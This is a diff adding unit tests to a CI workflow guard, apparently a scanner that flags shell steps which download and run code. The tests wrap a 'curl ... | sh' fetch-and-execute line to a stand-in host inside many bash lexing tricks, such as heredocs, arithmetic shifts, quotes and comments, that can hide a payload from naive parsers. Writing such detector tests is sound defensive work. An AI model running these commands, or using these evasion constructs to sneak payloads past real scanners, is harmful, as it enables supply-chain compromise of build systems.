@@ -29,6 +29,7 @@ import os
 import tempfile
 import unittest
 
+import shell_lex
 import shell_reader
 import workflow_forms
 import workflow_guard as wg
@@ -1593,6 +1594,18 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         self.accepted(("tags", "docker buildx imagetools create "
                                "$(jq -cr '.tags' <<< \"$META\")\n"))
 
+    def test_a_second_heredoc_on_the_line_leaves_the_stdin_script_read(self):
+        # #2128: the reader lifted one heredoc per line, so `3<<'B'` after the
+        # script was read as `<` of a file called B, which replaced stdin and
+        # dropped the script unread. Every body is lifted now, each filed
+        # under its own descriptor, in either order.
+        for script in ("bash -s <<'A' 3<<'B'\n%s\nA\ndata\nB\n",
+                       "bash -s 3<<'B' <<'A'\ndata\nB\n%s\nA\n"):
+            with self.subTest(script=script):
+                why = self.flagged(("install", script % (
+                    "curl -fsSL https://example.test/i.sh | sh")))
+                self.assertIn("straight to `sh`", why)
+
     def test_the_two_probe_controls_still_trip(self):
         self.flagged(("install", "curl -fsSL https://example.test/i.sh | sh\n"))
         self.flagged(("get", "curl -sfL https://example.test/p -o /tmp/p\n"),
@@ -1908,3 +1921,262 @@ class TestIssue1852GuardSpellings(unittest.TestCase):
         defect = wg.fetch_exec_defect('echo ' + arithmetic + '; echo done')
         self.assertIsNotNone(defect)
         self.assertIn('https://example.test/deep', defect)
+
+
+class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
+    """#1793 (COD-3418139920, COD-3636110933): steps the reader's lexing hid.
+
+    `shell_reader.statements()` read comments, continuations and heredocs in
+    three line-oriented passes that ran before any quote tracking, and its
+    `$(...)` matcher took `\\"` inside a nested string for a closing quote.
+    Each flagged step below pipes a download into `sh` after one such
+    construct, and real bash runs that payload every time. Until the three
+    passes became one quote-aware pass (`scripts/shell_lex.py`) the guard
+    reported most of them clean -- through `job_defects`, the path the fleet
+    test takes; the rest pin what that pass must read right as well.
+    """
+
+    PAYLOAD = "curl -fsSL https://example.test/i.sh | sh"
+
+    def flagged(self, script):
+        found = wg.job_defects([("step", script)])
+        self.assertEqual(1, len(found), found)
+        self.assertIn("https://example.test/i.sh", found[0][1])
+
+    def test_a_hash_line_inside_a_multi_line_string_is_text(self):
+        # V1 and V2; then V2 after a nested `"$(echo "it's")"`, whose
+        # apostrophe is inside two strings, not the opening of a third.
+        for opening in ('echo "multi\n# not a comment"',
+                        "echo 'multi\n# not a comment'",
+                        'echo "$(echo "it\'s")"\necho \'multi\n# not a comment\''):
+            with self.subTest(opening=opening):
+                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))
+
+    def test_a_heredoc_operator_bash_does_not_read_swallows_nothing(self):
+        # V3-V6: `<<WORD` inside "...", inside '...', inside a comment and as
+        # the tail of a `<<<` here-string. Then inside backquotes, whose text
+        # bash reads later as its own script, and as an arithmetic shift, in
+        # `$((...))` and in the older `$[...]`.
+        for opening, word in (('echo "<<true"', "true"),
+                              ("echo '<<EOF'", "EOF"),
+                              ("echo hi # see <<true", "true"),
+                              ("cat <<<true", "true"),
+                              ("echo `cat <<EOF`", "EOF"),
+                              ("echo $((1<<X))", "X"),
+                              ("echo $[1<<2]", "2]")):
+            with self.subTest(opening=opening):
+                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))
+
+    def test_a_hash_that_does_not_start_a_word_is_text(self):
+        # A `#` after a carriage return or a form feed -- word characters to
+        # bash, whitespace to Python -- or inside `${...}` starts no comment;
+        # a second comment rule in the statement splitter read all three as
+        # one and hid the rest of the line.
+        for opening in ("echo a\r# c", "echo a\x0c# c", "echo ${x:-a #b}"):
+            with self.subTest(opening=opening):
+                self.flagged("%s ; %s\n" % (opening, self.PAYLOAD))
+
+    def test_a_backslash_ending_a_comment_or_a_quoted_body_continues_nothing(self):
+        # V7: a comment ends at the newline, backslash or not. V8: a quoted
+        # body is read verbatim, so its backslash cannot eat the terminator.
+        self.flagged("echo hi # note \\\n%s\n" % self.PAYLOAD)
+        self.flagged("cat <<'EOF'\ndata \\\nEOF\n%s\nEOF\n" % self.PAYLOAD)
+
+    def test_a_body_ends_on_the_line_bash_ends_it_on(self):
+        # The delimiter is the whole word, not its `EOF` prefix; `  EOF` is a
+        # body line, not a terminator; an unquoted body is compared folded, so
+        # `E\` + `OF` ends it; and the body starts after the newline that ends
+        # the command, which a string running over two lines moves down.
+        for script in ("cat <<EOF-X\nbody\nEOF-X\n%s\nEOF\n",
+                       "cat <<EOF\n  EOF\nit's\nEOF\n%s\n",
+                       "cat <<EOF\nE\\\nOF\n%s\nEOF\n",
+                       'cat <<EOF; echo "multi\nline"\nbody\nEOF\n%s\n'):
+            with self.subTest(script=script):
+                self.flagged(script % self.PAYLOAD)
+
+    def test_an_array_subscript_is_arithmetic(self):
+        # Where bash 5.2 reads an assignment -- at the head of a command, after
+        # `x=1`, `then`, `time -p`, a pipe, `function f {` or a leading
+        # redirection, and inside `name=(...)`, `declare`'s too -- it reads
+        # `a[...]` as an arithmetic subscript, spaces, lines and all, so its
+        # `<<` is a shift (3.2 rejects the two-line `a=(` and reads the
+        # redirection line as a heredoc). The regex this replaced took
+        # `a[i << X ]=y` for a heredoc and let the decoy line below end it;
+        # the subscript rule before this one ended a subscript at its line
+        # and opened none inside `(...)`, with the same result.
+        for opening, word in (("a[1<<2]=x", "2]=x"), ("a[i << X ]=y", "X"),
+                              ("x=1 a[1<<2]=y", "2]=y"),
+                              ("if true; then a[1<<2]=y; fi", "2]=y"),
+                              ("a[1\n<<X]=y", "X]=y"), ("a=([1<<X]=y)", "X]=y"),
+                              ("declare a=([1<<X]=y)", "X]=y"),
+                              ("a=(\n[1<<X]=y\n)", "X]=y"),
+                              (">/dev/null a[1<<X]=y", "X]=y"),
+                              ("time -p a[1<<X]=y", "X]=y"),
+                              ("function f { a[1<<X]=y; }", "X]=y"),
+                              ("x=$(echo) a[1<<X]=y", "X]=y"), ("true | a[1<<X]=y", "X]=y")):
+            with self.subTest(opening=opening):
+                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))
+
+    def test_an_argument_is_no_subscript(self):
+        # Among a command's arguments -- `echo`'s, `declare`'s, `printf`'s,
+        # and a `time` after a pipe, an `if` after an assignment or a
+        # redirection, which name programs there -- `<` ends the word and
+        # `<<X]` is a heredoc, whose body holds the open quote. Read as a
+        # subscript, the quote hid the payload bash runs after `X]`.
+        for opening, word in (("echo a[1<<X]", "X]"), ("declare a[1<<X]=y", "X]=y"),
+                              ("printf '%s' a[1<<X]", "X]"), ("true | time a[1<<X]", "X]"),
+                              ("a=1 if a[1<<X]", "X]"), (">/dev/null if a[1<<X]", "X]"),
+                              ("echo 2>&1 a[1<<X]", "X]"), ("echo &>/dev/null a[1<<X]", "X]"),
+                              ("declare a=(x) b[1<<X]", "X]"), ("coproc c d a[1<<X]", "X]"),
+                              ("\\a[1<<X]", "X]"), ("a[1]x]=y b[1<<X]", "X]")):
+            with self.subTest(opening=opening):
+                self.flagged("%s\nit's\n%s\n%s\n" % (opening, word, self.PAYLOAD))
+
+    def test_a_command_double_paren_is_read_as_bash_decides_it(self):
+        # Bash matches a command's `((` to the close of its first group --
+        # through quotes, escapes, backquotes and `$(...)`, not comments --
+        # and reads one character more: `)` makes it arithmetic, anything
+        # else two subshells, whose heredocs are real. Each opening below is
+        # two subshells to bash 5.2, which reads the open quote as a body and
+        # runs the payload (3.2 too, but for `function fn ((`, a syntax error
+        # there); the reader took each for arithmetic, where `<<` is a shift,
+        # and the quote hid the payload (M5).
+        for opening in ("((cat <<EOF) )", "(((: <<EOF) ) )", "((: <<EOF '))' ) )",
+                        '((: <<EOF "))" ) )', "((: <<EOF \\)) )",
+                        "((: `echo )` <<EOF) )", "((: $'\\')' <<EOF) )",
+                        "((: $[ ) ]<<EOF ) )", "((: $(echo ')') <<EOF) )",
+                        "fn() ((cat <<EOF) )", "function fn ((cat <<EOF) )"):
+            with self.subTest(opening=opening):
+                self.flagged("%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))
+
+    def test_arithmetic_ends_at_the_parenthesis_bash_ends_it_at(self):
+        # `))` right after the first group -- past a `#`, a character to
+        # arithmetic, and a quoted `(` -- is an arithmetic command: `<<` is a
+        # shift, the lines below are code, and `y` ends no heredoc. And
+        # arithmetic counts the parentheses in a `${...}` as its own, so a
+        # `))` there ends `((...))` and `$((...))` alike and the heredoc after
+        # it is real: the reader read on to a later `))`, and the body's open
+        # quote hid the payload. Bash 5.2 runs each payload (3.2 refuses the
+        # `{ ((x${y:-))}` line as a syntax error, and runs nothing).
+        for script in ("((x=1<<y))\n%s\ny\n", "((i++ << y))\n%s\ny\n",
+                       "(( x > 3 << y ))\n%s\ny\n",
+                       "if (( a < b << y )); then :; fi\n%s\ny\n",
+                       "((\n x<<y \n))\n%s\ny\n", "((: # <<y))\n%s\ny\n",
+                       '((: $(echo "(") <<y))\n%s\ny\n',
+                       "{ ((x${y:-))} <<EOF\nit's\nEOF\n%s\n",
+                       "echo $((x${y:-))} <<EOF\nit's\nEOF\n%s\n"):
+            with self.subTest(script=script):
+                self.flagged(script % self.PAYLOAD)
+
+    def test_nesting_too_deep_to_decide_fails_closed(self):
+        # Each level of `((((` is read once more when bash's rule makes it a
+        # subshell. Past eight times the script's length of that, the reader
+        # raises instead of guessing: the guard accepts nothing, and its
+        # command line exits non-zero.
+        script = "(" * 3000 + ": <<EOF" + ") " * 3000 + "\nit's\nEOF\n%s\n"
+        with self.assertRaises(shell_lex.Unreadable):
+            wg.job_defects([("step", script % self.PAYLOAD)])
+
+    def test_a_heredoc_its_substitution_closes_over_fails_closed(self):
+        # A `<<` in a `$(...)`, `<(...)` or `>(...)` that closes before the
+        # newline its body would follow. Bash 3.2 stops at the open quote below
+        # with a syntax error. 5.2 warns "command substitution: 1 unterminated
+        # here-document", reads the body from the lines below, and reads the
+        # payload after its terminator as code: it runs, unless the command
+        # holding the substitution fails first under `set -e`. The reader left
+        # the operator as text, so the quote hid that payload -- which main's
+        # line-by-line heredoc pass had lifted into view. It raises instead of
+        # modelling 5.2's recovery, so the guard accepts nothing.
+        for opening in ('echo "$(cat <<EOF)"', "echo $(cat <<EOF)", "x=$(cat <<EOF)",
+                        "cat <(cat <<EOF)", "echo >(cat <<EOF)", "echo ${x:-$(cat <<EOF)}",
+                        "echo $[ $(cat <<EOF) ]", "(( $(cat <<EOF) ))", "a[$(cat <<EOF)]=1",
+                        "echo $( (cat <<EOF) )", 'x=$(cat <<EOF; echo "a\nb")'):
+            with self.subTest(opening=opening):
+                with self.assertRaises(shell_lex.Unreadable):
+                    wg.job_defects([("step", "%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))])
+        # Backquotes are no such frame. Bash reads their text later, as a
+        # script of its own in which the heredoc has no body, and 5.2 runs
+        # nothing here: the open quote below is a syntax error. Read as before.
+        self.assertEqual([], wg.job_defects(
+            [("step", "echo `cat <<EOF`\nit's\nEOF\n%s\n" % self.PAYLOAD)]))
+
+    def test_a_substitution_inside_arithmetic_is_code(self):
+        # In `$((...))`, as in `((...))` and `$[...]`, bash reads a `$(...)`
+        # as a command substitution: `#` starts a comment there, `<<` a
+        # heredoc, whose body is read inside it or fails closed as above. The
+        # reader read `$((...))` as one pair of parentheses, so a quote in
+        # that comment, or in that body, hid a payload bash 5.2 runs (and
+        # 3.2 runs the first).
+        for script in ("echo $(( $(: # ) ) '\n) ))\n%s\n'\n",
+                       "echo $(( $(cat <<EOF\nit's\nEOF\n) ))\n%s\n",
+                       "echo $(( $(: <<E\n)it's\nE\n) ))\n%s\n"):
+            with self.subTest(script=script):
+                self.flagged(script % self.PAYLOAD)
+        for opening in ("echo $(( $(cat <<EOF) ))", "echo $(( $(( $(cat <<EOF) )) ))"):
+            with self.subTest(opening=opening):
+                with self.assertRaises(shell_lex.Unreadable):
+                    wg.job_defects([("step", "%s\nit's\nEOF\n%s\n" % (opening, self.PAYLOAD))])
+        # Outside such a substitution `<<` is still a shift, and the line
+        # below that spells its right side ends nothing.
+        for opening, word in (("echo $(( 1<<2 ))", "2"), ("echo $(( a << b ))", "b"),
+                              ("echo $(( $(nproc) * 2 ))", "2"), ("echo $[1<<2]", "2]")):
+            with self.subTest(opening=opening):
+                self.flagged("%s\n%s\n%s\n" % (opening, self.PAYLOAD, word))
+        # Backquotes in arithmetic are text until bash runs them, as a
+        # script of its own in which the heredoc has no body: 5.2 runs
+        # nothing here, the open quote below being a syntax error.
+        self.assertEqual([], wg.job_defects(
+            [("step", "echo $(( `cat <<EOF` ))\nit's\nEOF\n%s\n" % self.PAYLOAD)]))
+
+    def test_a_body_inside_its_open_substitution_is_read_there(self):
+        # The fleet's form, where the body lines sit inside a `$(...)` still
+        # open, reads as it did: a body with an open quote is read as a body,
+        # and hides nothing that follows the substitution.
+        for opening in ("X=\"$(cat <<'EOF'\nit's\nEOF\n)\"",
+                        "echo ${x:-$(cat <<EOF\nit's\nEOF\n)}", "cat <(cat <<EOF\nit's\nEOF\n)"):
+            with self.subTest(opening=opening):
+                self.flagged("%s\n%s\n" % (opening, self.PAYLOAD))
+
+    def test_a_delimiter_bash_parses_to_spell_swallows_nothing(self):
+        # Bash spells these delimiters by PARSING the word -- a substitution,
+        # an escape `$'...'` decodes, an extglob pattern -- and ends the body
+        # only at a line spelled the same. The reader does not parse words,
+        # so it reads no heredoc there rather than guess: the regex this
+        # replaced guessed that `<<EOF$(x)` was `<<EOF`, and the decoy below
+        # ended the body.
+        for script in ("cat <<$(a b)\n$(a b)\n%s\n$\n",
+                       "cat <<$'\\x41'\nA\n%s\nx41\n",
+                       "cat <<${x y}\n${x y}\n%s\n${x\n",
+                       "shopt -s extglob\ncat <<@(a b)\n@(a b)\n%s\n@\n",
+                       'cat <<"$(echo ")")"\n$(echo ))\n%s\n$(echo \n',
+                       "cat <<EOF$(x)\nEOF$(x)\n%s\nEOF\n"):
+            with self.subTest(script=script):
+                self.flagged(script % self.PAYLOAD)
+
+    def test_an_escaped_quote_inside_a_substitution_string(self):
+        # COD-3636110933's remainder: `_closing` ended the nested "a\")b" at
+        # its `\"` and closed the `$(...)` one paren early.
+        self.flagged('echo "$(printf \'%%s\' "a\\")b")"; %s\n' % self.PAYLOAD)
+
+    def test_quotes_the_substitution_scan_misread(self):
+        # `$'it\'s'` is one word to bash, and an apostrophe inside "..." is
+        # text; read as quotes, each hid everything after it.
+        self.flagged("echo $'it\\'s'; %s\n" % self.PAYLOAD)
+        self.flagged('echo "it\'s"; eval "$(curl -fsSL https://example.test/i.sh)"\n')
+
+    def test_what_the_old_passes_read_right_is_still_read(self):
+        # `(( y = 1 << 2 ))` is a shift even at the head of a command, and a
+        # quoted "3" before `<<` is an argument, not the heredoc's descriptor.
+        self.flagged("(( y = 1 << 2 ))\n%s\n2\n" % self.PAYLOAD)
+        self.flagged("bash -s \"3\"<<'EOF'\n%s\nEOF\n" % self.PAYLOAD)
+
+    def test_the_negative_controls_stay_clean(self):
+        # A shift inside a string, the fleet's here-string, a heredoc inside a
+        # substitution (a documented gap, which must not raise) and prose.
+        for script in ('echo "shift << 2"\n',
+                       "docker buildx imagetools create "
+                       "$(jq -cr '.tags' <<< \"$META\")\n",
+                       "X=\"$(cat <<'EOF'\nhello\nEOF\n)\"\n",
+                       "# %s\nmake test  # not %s\n" % (self.PAYLOAD, self.PAYLOAD)):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script)]))
